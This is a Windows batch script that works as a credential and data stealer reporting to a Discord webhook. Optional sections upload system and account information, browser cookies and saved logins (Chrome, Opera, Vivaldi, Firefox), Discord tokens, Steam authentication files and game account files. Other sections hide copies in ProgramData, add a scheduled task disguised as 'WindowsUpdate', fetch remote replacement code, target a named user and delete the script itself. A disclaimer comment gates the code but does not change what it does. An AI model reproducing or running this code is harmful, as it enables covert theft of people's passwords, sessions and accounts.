@echo off
:: BY REMOVING THE GOTO(s) YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
:: SOME GOTO(s) ARE NECESSARY, SO WATCH WHAT YOU REMOVE.

goto remove_this_if_you_agree_to_follow_the_TOS

:: Path of the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that. This is part of the recurring method.
set "vpath=C:\ProgramData"

cd %vpath%

:: If using onlogin on Task Scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
goto skipadministrator
if not "%~dp0"=="%vpath%\" (
	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
)
:skipadministrator

:: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
:: --------------------------------------
set "webhook=https://discord.com/api/webhooks/"

:: GET IP ADDRESS
:: --------------
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

:: GET TIME
:: --------
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)

:: SEND FIRST REPORT MESSAGE WITH SOME INFO
:: ----------------------------------------
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%

:: SCREENSHOT - REMOVE GOTO IF YOU WANT TO TAKE A SCREENSHOT WHEN RUN
:: ------------------------------------------------------------------
goto skipscreenshot
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
	IF EXIST "s.exe" GOTO waitloop3
	curl --silent -L --fail "%ssurl%" -o s.exe
	>NUL attrib "%vpath%\s.exe" +h
	:waitloop3
	IF EXIST "s.exe" GOTO waitloopend3
	timeout /t 5 /nobreak > NUL
	:waitloopend3
	2> NUL s.exe -wh 1e9060a -o s.png
	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
	2>NUL del "%vpath%\s.png"
:skipscreenshot

:: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
goto skipsysteminfocapture
	set "tempsys=%appdata%\sysinfo.txt"
	2>NUL SystemInfo > "%tempsys%"
	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
	del "%tempsys%" >nul 2>&1
:skipsysteminfocapture

:: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
goto skiptasklist
	set "temptasklist=%appdata%\tasklist.txt"
	2>NUL tasklist > "%temptasklist%"
	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
	del "%temptasklist%" >nul 2>&1
:skiptasklist

:: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
goto skipnetuser
	set "netuser=%appdata%\netuser.txt"
	2>NUL net user > "%netuser%"
	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
	del "%netuser%" >nul 2>&1
:skipnetuser

:: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
goto skipquser
	set "quser=%appdata%\quser.txt"
	2>NUL quser > "%quser%"
	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
	del "%quser%" >nul 2>&1
:skipquser

:: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
goto skipcmdkey
	set "cmdkey=%appdata%\cmdkey.txt"
	2>NUL cmdkey /list > "%cmdkey%"
	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
	del "%cmdkey%" >nul 2>&1
:skipcmdkey

:: IPCONFIG /ALL - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
goto skipipconfig
	set "ipconfig=%appdata%\ipconfig.txt"
	2>NUL ipconfig /all > "%ipconfig%"
	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
	del "%ipconfig%" >nul 2>&1
:skipipconfig

:: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------
goto skipchrome
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipchrome

:: OPERA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: -----------------------------------------------------
goto skipopera
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipopera

:: VIVALDI - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: -------------------------------------------------------
goto skipvivaldi
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- VIVALDI -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%localappdata%\Vivaldi\User Data\Default\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%localappdata%\Vivaldi\User Data\Default\History" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F s=@"%localappdata%\Vivaldi\User Data\Default\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%localappdata%\Vivaldi\User Data\Default\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%localappdata%\Vivaldi\User Data\Default\Login Data" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipvivaldi

:: FIREFOX - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: -------------------------------------------------------
goto skipfirefox
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db" %webhook%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db" %webhook%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite" %webhook%
	
	timeout /t 2 /nobreak > NUL
	)
)
:skipfirefox

:: osu! - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ----------------------------------------------------
goto skiposu
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- osu! -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%localappdata%\osu!\osu!.%username%.cfg" %webhook%
:skiposu

:: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: -------------------------------------------------------
goto skipdiscord
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
	echo %%f|find ".ldb"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)
:skipdiscord

:: STEAM - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: -----------------------------------------------------
goto skipsteam
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
for /f %%s in ('2^>NUL dir /b "C:\Program Files (x86)\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)
for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)
:skipsteam

:: MINECRAFT - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ---------------------------------------------------------
goto skipminecraft
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipminecraft

:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ---------------------------------------------------------
goto skipgrowtopia
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA -```\"}"  %webhook%
	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipgrowtopia

:: OTHER
:: -----

:: DO NOT EDIT
set "recurring=false"

:: RECURRING - REMOVE THE GOTO IF YOU WANT IT | MAKES TASK SCHEDULER OPEN THE FILE | UPDATER CAN BE ENABLED TO UPDATE THE BATCH | CAN TARGET USERS
:: ----------------------------------------------------------------------------------------------------------------------------
goto skiprecurring

:: Change attributes to make editing files possible
>NUL attrib -h "%vpath%\%uname%"
>NUL attrib -h "%vpath%\%bname%"
>NUL attrib -h "%vpath%\%vname%"

:: MINUTE (1 - 1439 minutes), HOURLY (1 - 23 hours), DAILY (1 - 365 days), WEEKLY (1 - 52 weeks), MONTHLY (1 - 12 months/ lastday), ONCE, ONSTART (DOESN'T REALLY WORK), ONLOGON (REQUIRE ADMINISTRATOR & UPDATER NOT TESTED WITH THIS. FILES MADE WITH ADMINISTRATOR PERMS MAY NOT BE EDITABLE BY THE UPDATER.)
set "when=Daily"
:: Name that will show up on Task Scheduler. Default = WindowsUpdate
set "ScheduleName=WindowsUpdate"
:: Name of this batch file's copy to the selected path. Default = 0.bat
set "bname=0.bat"
:: Name of the updater batch. Default = 1.bat
set "uname=1.bat"
:: Name of the VBS file that will be hidden and executed by task scheduler, the file opens the batch hiddenly. Default = 0.vbs
set "vname=0.vbs"

:: Task Scheduler runs a downloader, it will download the text from your URL and replace it with the current batch file. Needs to be raw link. Leave blank to skip.
set "updateurl="
:: Target computer's username (Case sensitive) | Leave blank to skip.
	set "targetusername="

del /ah "%vpath%\%uname%" >nul 2>&1
del /ah "%vpath%\%vname%" >nul 2>&1

:: Copy the batch to the hidden location
if not "%~dp0"=="%vpath%\" (
  del /ah "%vpath%\%bname%" >nul 2>&1
  >NUL copy "%~f0" "%vpath%\%bname%"
)

if "%updateurl%"=="" (
	:normalrecurring
	echo set WshShell = wscript.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"
	
:: DO NOT REMOVE
	goto skipupdateconfig
	
) else ( goto recurringupdate )

goto dontremoveme
:recurringupdate

:: IF TARGET USERNAME IS SET
if "%targetusername%"=="" (
	goto nontargetedupdate 
) else ( goto targetedupdate )

goto dontremoveme2
:nontargetedupdate
:: TARGET USERNAME IS NOT SET, UPDATING ON EVERY COMPUTER

	IF EXIST "%vpath%\temp.txt" del "%vpath%\temp.txt" >nul 2>&1

	:: Change VBS
	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"

	:: Make updater batch
	echo ^@echo off> "%vpath%\%uname%"
	echo cd "%vpath%">> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo :wl>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
	echo timeout /t 1 >> "%vpath%\%uname%"
	echo goto wl>> "%vpath%\%uname%"
	echo :w2>> "%vpath%\%uname%"
	echo 2^>NUL del %bname%>> "%vpath%\%uname%"
	echo ren temp.txt %bname%>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo start %vname%>> "%vpath%\%uname%"
	echo timeout 1 ^>nul>> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"

goto skipupdateconfig
:dontremoveme2

goto dontremoveme3
:targetedupdate
:: TARGET USERNAME IS SET, UPDATING ON TARGET PC

IF "%USERNAME%"=="%targetusername%" (

	IF EXIST "%vpath%\temp.txt" 2>NUL del "%vpath%\temp.txt"

	:: Change VBS
	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"

	:: Make updater batch
	echo ^@echo off> "%vpath%\%uname%"
	echo cd "%vpath%">> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo :wl>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
	echo timeout /t 1 >> "%vpath%\%uname%"
	echo goto wl>> "%vpath%\%uname%"
	echo :w2>> "%vpath%\%uname%"
	echo 2^>NUL del %bname%>> "%vpath%\%uname%"
	echo ren temp.txt %bname%>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo start %vname%>> "%vpath%\%uname%"
	echo timeout 1 ^>nul>> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"

	goto skipupdateconfig
) else ( goto normalrecurring )
:dontremoveme3
:dontremoveme
:skipupdateconfig

:: Make a scheduled task so the VBS -> Batch be ran every X 
>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %when%, is probably incorrect.")

:: Hide batch & VBS
>NUL attrib "%vpath%\%vname%" +h
>NUL attrib "%vpath%\%bname%" +h
>NUL attrib "%vpath%\%uname%" +h

:: END OF RECURRING METHOD
:: -----------------------
:skiprecurring

:: SEND REPORT ENDED MESSAGE
:: -------------------------
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Batch Scheduled: %recurring%\n[End of report]```\"}"  %webhook%

:: SELF DELETE AFTER EXECUTION
:: ---------------------------
goto skipselfdelete
if not "%~dp0"=="%vpath%\" (
	call :d & exit /b
	:d
	start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
)
:skipselfdelete

:remove_this_if_you_agree_to_follow_the_TOS
exit
